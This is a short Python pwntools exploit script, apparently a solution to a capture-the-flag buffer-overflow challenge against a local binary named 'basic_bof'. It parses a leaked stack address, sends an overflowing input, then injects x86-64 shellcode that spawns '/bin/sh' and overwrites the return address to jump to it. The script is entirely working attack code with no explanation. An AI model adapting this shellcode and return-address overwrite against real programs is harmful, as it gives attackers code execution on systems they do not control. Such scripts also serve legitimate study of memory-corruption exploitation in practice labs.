from pwn import *

p = process('./basic_bof')

p.recvuntil('Hint : ')
s = int(p.recvline().replace("\n",''),16)
print hex(s)

shell = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
payload = 'A'*(0x4a-0x4)
payload += p32(1000)

p.sendafter(":",payload)

payload = shell
payload += 'A'*(0x48-len(shell))
payload += p64(s)

p.sendlineafter("MSG ",payload)
p.interactive()
